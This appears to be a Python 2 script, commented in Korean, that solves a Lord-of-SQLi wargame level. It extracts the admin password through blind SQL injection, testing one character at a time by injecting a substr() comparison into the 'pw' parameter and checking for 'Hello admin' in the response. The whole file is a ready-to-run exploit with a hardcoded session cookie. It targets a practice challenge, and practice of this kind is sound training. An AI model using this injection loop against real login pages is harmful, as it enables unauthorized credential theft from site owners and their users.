#!/usr/bin/python
#-*-coding:utf-8  -*-


# Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests


password=""


for j in range(1,9):                            # 1~8자리 패스워드를 찾아야함
  print "%d" %j                                 # 현재 몇번째 인지 표시
  for i in range(48,128):                       # 대부분의 글자들 다 찾아내기
	url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=-1' or id='admin' and substr(pw," + str(j) + ",1)='" + chr(i)
	r = requests.post(url,cookies=(dict(PHPSESSID="j0col8jda7sukvnmg4dqont5r9"))) # 자신의 Session ID를 넣어야함.
	print str(j)+"번째 찾는 중 : "+chr(i)     # 대략적인 현재 위치를 확인하기 위함, 없어도 되는 코
	if 'Hello admin' in r.text:                 # 글자를 찾았을 경우!
	      password = password + chr(i)
	      print "[+]Password : " + password
	      break
